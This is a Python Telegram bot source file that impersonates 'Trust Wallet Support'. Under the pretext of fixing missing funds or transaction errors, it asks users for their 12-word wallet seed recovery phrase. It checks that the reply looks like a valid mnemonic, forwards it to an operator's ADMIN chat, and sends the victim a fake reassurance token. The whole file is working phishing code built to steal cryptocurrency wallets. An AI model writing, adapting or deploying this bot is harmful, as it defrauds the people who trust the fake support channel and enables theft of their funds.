from argparse import Action
from email.message import Message
import logging
from subprocess import call
from telegram.ext.updater import Updater
from telegram.update import Update
from telegram import ParseMode, Update
from telegram import ChatPermissions
from telegram import ChatMemberAdministrator
from telegram import Update, ForceReply, ChatMemberUpdated, ChatMember, ChatInviteLink, ChatJoinRequest, ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton
from telegram.callbackquery import CallbackQuery
from telegram import Chat, User, ChatMember, Bot
from telegram.chatpermissions import ChatPermissions
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, CallbackQueryHandler, ChatMemberHandler, ConversationHandler, ContextTypes
from telegram import Update
from telegram import (ChatAction)
from telegram.bot import Bot
from urllib import response
from urllib.request import urlopen
import datetime
from datetime import datetime as dt
import re
from datetime import timedelta
import calendar
import requests
import json
import os

TOKEN = os.environ.get("TOKEN")

ADMIN = os.environ.get("ADMIN")



def phraseCheck(txt):
    txtns = txt.replace(" ", "")
    txtnsLen = len(txtns)
    if txtns.isalpha() == True:
        if txtnsLen > 35 and txtnsLen < 160:
            txts = txt.split(" ")
            txtsLen = len(txts)
            if txtsLen == 12:
                isUpper = False
                for tx in txts:
                    res = bool(re.match(r'\w*[A-Z]\w*', tx))
                    if res == True:
                        isUpper = True
                        break
                if isUpper == True:
                    return [False, "Invalid, phrase should contain only letter with lowercase."]
                else:
                    return [True, "OK"]
            else:
                return [False, "Invalid, phrase should have only twelve words."]
        else:
            return [False, "Inavalid, pharse length."]
    else:
        return [False, "Invalid, phrase should contain only letters."]


def hey(update: Update, context: CallbackContext):
    bot = context.bot
    buttons = [[KeyboardButton("Live Support")]]
    context.bot.send_chat_action(
        chat_id=update.effective_message.chat_id, action=ChatAction.TYPING)
    context.bot.send_message(
        chat_id=update.effective_message.chat_id, text="Welcome to Trust Wallet Support\nKindly answer each for faster response. Click on Live Support to chat.", parse_mode="HTML", reply_markup=ReplyKeyboardMarkup(buttons, resize_keyboard=True))


def talk(update: Update, context: CallbackContext):
    bot = context.bot
    buttons = [
        [KeyboardButton("Missing Funds"), KeyboardButton("Transaction Error")], [KeyboardButton("Cancel")]]
    msg = "Hi {},\nKindly choose the issue you are facing.".format(
        update.message.from_user.first_name)
    context.bot.send_chat_action(
        chat_id=update.effective_message.chat_id, action=ChatAction.TYPING)
    context.bot.send_message(chat_id=update.message.from_user.id, text=msg,
                             parse_mode="HTML", reply_markup=ReplyKeyboardMarkup(buttons, resize_keyboard=True))


def ask(update: Update, context: CallbackContext):
    msg = "Provide 12 digit seed recovery phrase of the wallet having issues."
    context.bot.send_message(
        chat_id=update.effective_message.chat_id, text=msg, parse_mode="Html")
    return PH


def ph(update: Update, context: CallbackContext):
    isTron = phraseCheck(update.message.text)
    if isTron[0] == True:
        msg = "We have received your request. An unique token has been generated for you <code>#{}</code>. We will assist you shortly.".format(
            update.message.from_user.id)
        #print("ph num: " + update.message.text)
        buttons = [[KeyboardButton("Live Support")]]
        context.user_data["userphrase"] = update.message.text
        context.user_data["msg_id"] = update.message.message_id
        context.bot.send_message(chat_id=update.effective_message.chat_id,
                                 reply_to_message_id=update.message.message_id, text=msg, parse_mode="Html", reply_markup=ReplyKeyboardMarkup(buttons, resize_keyboard=True))
        context.bot.forward_message(chat_id=ADMIN, from_chat_id=update.message.from_user.id,
                                    message_id=context.user_data["msg_id"], disable_notification=None)
        return ConversationHandler.END
    else:
        context.bot.send_message(
            chat_id=update.effective_message.chat_id, text=isTron[1]+" Type /cancel to close request.")
        return PH


def cancel(update: Update, context: CallbackContext):
    bot = context.bot
    buttons = [[KeyboardButton("Live Support")]]
    bot.send_message(chat_id=update.effective_message.chat_id,
                     text="You cancel request has been accepted.", parse_mode="HTML", reply_markup=ReplyKeyboardMarkup(buttons, resize_keyboard=True))
    return ConversationHandler.END


ASK, PH = range(2)


def main():
    updater = Updater(token=TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", hey))
    conv_handler = ConversationHandler(
        entry_points=[MessageHandler(Filters.regex(
            "^(Missing Funds|Transaction Error)$"), ask)],
        states={
            ASK: [MessageHandler(~Filters.command, ask)],
            PH: [MessageHandler(~Filters.command, ph)]},
        fallbacks=[CommandHandler("cancel", cancel)]
    )
    dp.add_handler(MessageHandler(Filters.text("Live Support"), talk))
    dp.add_handler(MessageHandler(Filters.regex("^(cancel|Cancel)$"), cancel))
    dp.add_handler(conv_handler)
    updater.start_polling()
    updater.idle()


# start application with main function
if __name__ == '__main__':
    main()
